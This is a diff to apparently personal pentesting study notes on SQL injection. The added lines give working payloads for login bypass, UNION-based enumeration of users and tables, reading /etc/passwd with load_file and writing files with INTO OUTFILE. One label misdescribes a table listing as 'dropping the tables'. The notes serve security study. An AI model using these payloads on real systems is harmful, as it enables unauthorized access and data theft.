@@ -46,6 +46,12 @@ Injecting SQL commands into input fields to produce output
 
 SQL injection usually occurs when you ask a user for input, like their username/userid, and instead of a name/id, the user gives you an SQL statement that you will unknowingly run on your database.
 
+- **SQLi is used for**:
+  - Bypass authentication
+  - Extract information
+  - Insert injection
+
+
 **SQL Syntax - Basics:**
 
 SQL Command | Info.
@@ -58,6 +64,7 @@ SQL Command | Info.
 ``DROP TABLE`` | deletes a table
 ``CREATE INDEX`` | creates an index (search key)
 ``DROP INDEX`` | deletes an index
+``UNION`` | is used to combine the result-set of two or more SELECT statements.
 
 ---
 
@@ -69,30 +76,50 @@ SQL Command | Info.
 - The is valid and will not return only UserId 105, this injection will return ALL rows from the "Users" table, **since OR 1=1 is always TRUE**. Then, the SQL statement will look like this:
     - `SELECT * FROM Users WHERE UserId = 105 OR 1=1;`
 
-- Double dash (`--`) tells the server to ignore the rest of the query (in this example, the password check)
+- Double dash ( `--` ) tells the server to ignore the rest of the query (in this example, the password check)
 
-- `"' OR 1 = 1 --"` into a login field - basically tells the server **if 1 = 1 (always true)** to allow the login.
+> ⚠️ **Basic test to see if SQL injection is possible is just inserting a single quote ( `'` )**
+>  - Can be on input field or URL
+>  - This will make the web app return a SQL syntax error meaning that you are able to inject SQL queries.
+
+
+**Bypassing authentication:**
+- `admin' or 1=1 -- ` 
+  - Basically tells the server **if 1 = 1 (always true)** to allow the login and the double dash `--` will comment the rest of the query in this case, the password.
+- variations: `1' or 1=1 #`
 
 - Based on `=` is always true;
     - `" or ""="` --> The SQL above is valid and will return all rows from the "Users" table, since OR ""="" is always TRUE. 
     - This is valid and the SQL statement behind will look like this: ` SELECT * FROM Users WHERE Name ="John Doe" AND Pass ="myPass" `
 
+**<u>Enumerating:</u>**
+- `1' union all select 1,user() #`
+  - The service are running as
 
-- Basic test to see if SQL injection is possible is just inserting a single quote (`'`)
+- `user' UNION ALL select 1,table_name,3,4,5 FROM information_schema.tables`
+  - Dropping the tables 
 
-- **Fuzzing** - inputting random data into a target to see what will happen
+**<u>Load/Reading a file:</u>**
+- `bob' union all select 1,load_file("/etc/passwd"),3,4,5 --`
+  - Reading the /etc/passwd file
 
-- **Tautology** - using always true statements to test SQL (e.g. `1=1`)
+**<u>Writing a file:</u>**
+- `bob' union all select 1,"Test",3,4,5 into outfile '/tmp/test.txt'--`
+  - Writes the selected rows to a file. Column and line terminators can be specified to produce a specific output format.
 
-- **In-band SQL injection** - uses same communication channel to perform attack
+**Fuzzing** - inputting random data into a target to see what will happen
 
-- Usually is when data pulled can fit into data exported (where data goes to a web table)
+**Tautology** - using always true statements to test SQL (e.g. `1=1`)
 
-- Best for using UNION queries
+**In-band SQL injection** - uses same communication channel to perform attack
 
-- **Out-of-band SQL injection** - uses different communication channels (e.g. export results to file on web server)
+  - Usually is when data pulled can fit into data exported (where data goes to a web table)
 
-- **Blind/inferential** - error messages and screen returns don't occur; usually have to guess whether command work or use timing to know
+  - Best for using `UNION` queries
+
+**Out-of-band SQL injection** - uses different communication channels (e.g. export results to file on web server)
+
+**Blind/inferential** - error messages and screen returns don't occur; usually have to guess whether command work or use timing to know
 
 - **SQLi Tools:**
   - Sqlmap
